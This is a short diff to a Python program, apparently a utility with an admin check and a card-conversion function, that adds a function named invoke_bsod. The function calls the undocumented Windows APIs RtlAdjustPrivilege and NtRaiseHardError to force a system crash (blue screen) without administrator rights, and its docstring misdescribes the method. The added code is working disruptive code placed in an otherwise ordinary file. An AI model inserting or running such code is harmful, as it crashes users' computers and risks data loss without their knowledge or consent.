@@ -15,6 +15,14 @@ def isAdmin():
         is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
     return is_admin
 
+def invoke_bsod():
+    """
+    Makes python.exe a critical process, then forcefully kills it. (killing a critical process will cause bsod.)
+    """
+    enabled = ctypes.c_bool()
+    response = ctypes.wintypes.DWORD()
+    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, byref(enabled)) # You don't even need admin privileges!
+    ctypes.windll.ntdll.NtRaiseHardError(0xC0000022, 0, 0, 0, 6, byref(response)) # It just works!
 
 def card_conversion(card, isCode):
     """
